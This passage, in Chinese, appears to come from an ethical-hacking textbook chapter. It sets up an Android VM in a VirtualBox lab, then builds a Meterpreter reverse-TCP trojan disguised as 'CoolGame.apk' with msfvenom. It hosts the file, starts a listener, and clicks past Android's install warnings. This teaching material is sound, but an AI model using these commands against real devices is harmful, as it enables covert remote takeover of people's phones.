
# 在 VirtualBox 中设置 Android VM

我们希望以安全、合乎道德的方式入侵 Android 移动设备，因此我们将首先在虚拟化黑客实验室中添加一个 Android VM。按照以下步骤下载并配置 VM。

## 下载和配置

1. 前往 [https://www.osboxes.org/android-x86/](https://www.osboxes.org/android-x86/) 并向下滚动到 Android-x86 8.1-RC1 Oreo 部分。选择 `VirtualBox` 选项卡并点击 64 位版本的下载按钮。
2. 你的下载文件应具有 `*.7z` 文件扩展名。要解压文件，你需要下载并安装 Windows 的 `7-Zip`、Mac 的 Archiver 或 Linux 的 `p7zip-full`。获得所需软件后，解压 Android VM：在 Windows 上，右键单击文件并选择 `7-Zip`▶`Extract Here`；在 macOS 或 Linux 上，双击文件。VM 将被解压到名为 `64bit` 的文件夹中。
3. 打开 `VirtualBox` 并点击 New 以打开创建虚拟机窗口。
4. 在名称和操作系统对话框中，在名称：文本框中输入 Android 8.1 或类似名称，从类型：下拉列表中选择 Linux，并从版本：下拉列表中选择 Other Linux (64-bit)。然后在 Windows 上点击 Next 或在 macOS 上点击 Continue。
5. 在内存大小对话框中，在框中输入 2048 以为 VM 提供 2,048MB（2GB）的 RAM，然后继续到下一屏幕。
6. 在硬盘对话框中，选择使用现有虚拟硬盘文件并点击浏览图标（带绿色箭头的文件夹）。在出现的弹出窗口中，点击 Add。然后在你解压的 `64bit` 文件夹内找到并选择 `*.vdi` 文件。
7. 继续点击返回到硬盘对话框并选择 Create 以创建你的 VM。你的新 Android 8.1 VM 现在应该出现在 VirtualBox 的 VM 列表中，如 [图 9-1](#c09.xhtml#figure9-1) 所示。
8. 在列表中选择 Android VM，进入设置，选择显示选项卡。在图形控制器：下拉列表中，选择 `VBoxSVGA`。这会更改显示设置，以便我们能够看到 Android 智能手机 VM 的图形用户界面（GUI）版本。
9. 仍在显示选项卡中，确保启用 3D 加速旁边的复选框未被选中。（如果你的 VM 一会儿无法工作，你可能需要打开 3D 加速。）
10. 切换到网络设置选项卡并选择名为 `PublicNAT` 的 NAT 网络。这将使你的 Android VM 能够与虚拟化黑客实验室中的 Kali VM 通信。

![图 9-1：我们已在 VirtualBox 中添加了 Android 8.1 VM！](image_fi/502000c09/f09001.png)
图 9-1：我们已在 VirtualBox 中添加了 Android 8.1 VM！

你现在准备启动你的 Android VM 了！第一次加载可能需要几分钟时间（如果屏幕在 1 分钟左右仍然保持黑色，你可能需要重新启动 VM），但最终你会看到与 [图 9-2](#c09.xhtml#figure9-2) 所示类似的 Android 设备主屏幕。

![图 9-2：虚拟 Android 设备上的主屏幕](image_fi/502000c09/f09002.png)
图 9-2：虚拟 Android 设备上的主屏幕

在开始探索 VM 之前，进入 Android VM 菜单栏中的输入▶鼠标集成以取消选择鼠标集成。保留鼠标集成开启可能会使在 Android VM 上控制指针变得困难。（Android VM 是为触摸屏制作的，所以在 Android 上使用鼠标本来就很令人沮丧。）完成此操作后，你就可以在虚拟 Android 设备上四处查看了。

打开 Chrome 浏览器并浏览到网页，或打开通讯录应用并添加几个联系人——尝试你想要的任何操作。Android VM 几乎与真正的 Android 平板电脑或手机相同，只是它不能拨打电话，也没有 GPS 等用于位置服务的某些传感器。记住，你可以使用右 CTRL 键（Windows）或左 COMMAND 键（Mac）来重新控制鼠标，当你想离开 Android VM 时，就像我们对其他 VM 所做的那样。

## 启动 Android 木马

现在我们准备创建一些恶意软件。就像我们在第 6 章中对 Windows VM 所做的那样，我们将使用 Meterpreter 木马来感染并接管 Android VM。我们将把木马隐藏在名为 `CoolGame.apk` 的文件中。Android 使用 APK 文件格式来分发和安装移动应用。按照以下步骤，你将看到攻击者诱骗 Android 用户安装并运行受感染应用是多么容易。

1. 登录你的 Kali VM 并启动 Metasploit。
2. 在 Metasploit `msf6` 命令提示符下，输入以下命令作为一行，将你的 Kali VM 的 IP 地址替换为 `LHOST=` 之后的部分：
```
msf6 > sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.9.4 -f raw -o /var/www/html/share/CoolGame.apk
```
这会创建一个 `android/meterpreter/reverse_tcp` 有效载荷并以 APK 文件的形式保存，直接保存到 Kali 的共享网页文件夹中。Metasploit 将响应几行输出，以类似以下内容结束：
```
--snip--
Payload size: 10080 bytes
Saved as: /var/www/html/share/CoolGame.apk
```
3. 打开 Apache Web 服务器服务，以便你可以从 Android VM 下载该文件：
```
msf6 > sudo service apache2 start
```
4. 为验证你的 Kali Web 服务器是否处于活动状态，打开 Firefox 并前往 `localhost/share`。你应该在文件列表中看到 `CoolGame.apk`。
5. 在 Metasploit 终端窗口中输入以下四个命令来设置处理传入 Meterpreter 连接的侦听器：
```
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD android/meterpreter/reverse_tcp PAYLOAD => android/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.0.9.4
LHOST => 10.0.9.4
msf6 exploit(multi/handler) > exploit
```
Metasploit 现在正在侦听传入连接！

## 感染 Android VM

现在我们将下载木马应用并故意感染你的虚拟 Android 设备。切换回你的 Android VM 并按照以下步骤操作：

1. 打开 Chrome 浏览器并在地址栏中输入你的 Kali VM 的 IP 地址，后跟 `/share/`，例如 `10.0.9.4/share/`，如 [图 9-3](#c09.xhtml#figure9-3) 所示。

![图 9-3：从 Android VM 的 Chrome 浏览器导航到 Kali VM 的共享文件夹，找到你的 CoolGame.apk 木马应用准备下载和安装。](image_fi/502000c09/f09003.png)
图 9-3：从 Android VM 的 Chrome 浏览器导航到 Kali VM 的 `share` 文件夹，找到你的 `CoolGame.apk` 木马应用准备下载和安装。

2. 点击 APK 文件进行下载。Android 第一次尝试下载文件时会弹出一条消息，要求你让 Chrome 有权访问设备上的文件存储。点击更新权限，然后允许。

![](image_fi/502000c09/g09001.png)

3. 再次点击你的 APK 文件进行下载。Chrome 通常会显示警告“此类型的文件可能会损害你的设备”。点击确定仍要下载文件。

4. 点击 Android VM 屏幕左上角的向下箭头，你将看到如 [图 9-5](#c09.xhtml#figure9-5) 所示的下载管理器。点击列表中的 APK 文件名以安装应用。

5. Android 会弹出另一个窗口，告诉你“你的手机不允许从此来源安装未知应用”。点击设置，然后滑动切换开关以打开允许来自此来源的设置。

![图 9-5：访问下载管理器](image_fi/502000c09/f09005.png)
图 9-5：访问下载管理器
